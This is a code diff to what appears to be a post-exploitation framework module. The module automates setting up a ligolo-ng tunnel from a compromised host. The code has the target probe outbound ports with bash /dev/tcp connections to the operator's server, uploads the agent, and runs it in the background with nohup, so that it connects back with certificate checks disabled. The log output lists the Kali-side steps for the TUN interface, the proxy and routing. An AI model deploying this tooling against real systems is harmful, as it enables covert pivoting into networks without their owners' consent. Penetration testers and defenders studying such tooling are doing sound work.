@@ -4629,26 +4629,41 @@ class ligolo(Module):
 		elif mode == 'auto':
 			# Fully automated mode
 			logger.info("🚀 Starting fully automated ligolo-ng setup...")
+			logger.info("")
+			logger.info("📌 IMPORTANT: Make sure your Kali machine has:")
+			logger.info("   1. TUN interface ready: sudo ip tuntap add user $(whoami) mode tun ligolo")
+			logger.info("                           sudo ip link set ligolo up")
+			logger.info("   2. Proxy running: ./proxy -selfcert -laddr 0.0.0.0:<PORT>")
+			logger.info("   3. Type 'session' in proxy console to manage tunnels")
+			logger.info("")
 
 			# Get server IP and port
 			server_ip = args_list[1] if len(args_list) > 1 else session._host
 			server_port = args_list[2] if len(args_list) > 2 else "11601"
 
-			# Detect available ports on target
-			logger.info("🔍 Auto-detecting available outbound ports...")
-			test_ports = [11601, 443, 80, 8080, 8443, 53, 22]
-			available_port = None
+			# Test if specified port is accessible
+			logger.info(f"🔍 Testing connectivity to {server_ip}:{server_port}...")
+			result = session.exec(f"timeout 2 bash -c 'cat < /dev/null > /dev/tcp/{server_ip}/{server_port}' 2>&1", value=True)
 
-			for port in test_ports:
-				result = session.exec(f"timeout 2 bash -c 'cat < /dev/null > /dev/tcp/{server_ip}/{port}' 2>&1", value=True)
-				if result is None or "succeeded" in result.lower() or len(result.strip()) == 0:
-					available_port = port
-					logger.info(f"✅ Port {port} is available for outbound connection")
-					break
+			if result is not None and "Connection refused" in result:
+				logger.warning(f"⚠️  Port {server_port} connection refused. Testing alternative ports...")
+				test_ports = [11601, 443, 80, 8080, 8443, 53, 22]
+				port_accessible = False
 
-			if not available_port:
-				logger.warning("⚠️  No test ports available, using default 11601")
-				available_port = server_port
+				for port in test_ports:
+					if port == int(server_port):
+						continue
+					result = session.exec(f"timeout 2 bash -c 'cat < /dev/null > /dev/tcp/{server_ip}/{port}' 2>&1", value=True)
+					if result is None or "succeeded" in result.lower() or len(result.strip()) == 0:
+						logger.info(f"✅ Alternative port {port} is accessible")
+						logger.warning(f"💡 Consider running proxy on port {port} instead of {server_port}")
+						port_accessible = True
+						break
+
+				if not port_accessible:
+					logger.warning("⚠️  No alternative ports accessible. Proceeding with specified port anyway.")
+			else:
+				logger.info(f"✅ Port {server_port} is accessible")
 
 			# Upload and extract agent
 			if session.OS == 'Unix':
@@ -4685,13 +4700,20 @@ class ligolo(Module):
 							logger.info(f"   sudo ip route add {net} dev ligolo")
 
 				# Start agent in background
-				logger.info(f"🔗 Connecting to {server_ip}:{available_port}...")
-				cmd = f"nohup {agent_path} -connect {server_ip}:{available_port} -ignore-cert > /tmp/ligolo.log 2>&1 &"
+				logger.info(f"🔗 Connecting agent to {server_ip}:{server_port}...")
+				cmd = f"nohup {agent_path} -connect {server_ip}:{server_port} -ignore-cert > /tmp/ligolo.log 2>&1 &"
 				session.exec(cmd)
 
 				logger.info("✅ Ligolo-ng agent started in background!")
 				logger.info(f"📋 Log file: /tmp/ligolo.log")
 				logger.info(f"🔍 Check connection: tail -f /tmp/ligolo.log")
+				logger.info("")
+				logger.info("📌 Next steps on your Kali machine:")
+				logger.info("   1. Check proxy console for new session")
+				logger.info("   2. Type: session")
+				logger.info("   3. Select the session number")
+				logger.info("   4. Type: start")
+				logger.info("   5. Add routes: sudo ip route add <NETWORK> dev ligolo")
 
 			elif session.OS == 'Windows':
 				logger.info("📦 Uploading ligolo-ng agent...")
@@ -4700,7 +4722,7 @@ class ligolo(Module):
 				if uploaded_paths:
 					logger.info(f"⚠️  Windows: Manual extraction required")
 					logger.info(f"📂 Agent location: {uploaded_paths[0]}")
-					logger.info(f"🔗 Run: agent.exe -connect {server_ip}:{available_port} -ignore-cert")
+					logger.info(f"🔗 Run: agent.exe -connect {server_ip}:{server_port} -ignore-cert")
 			else:
 				logger.error("Unsupported OS")
 		else:
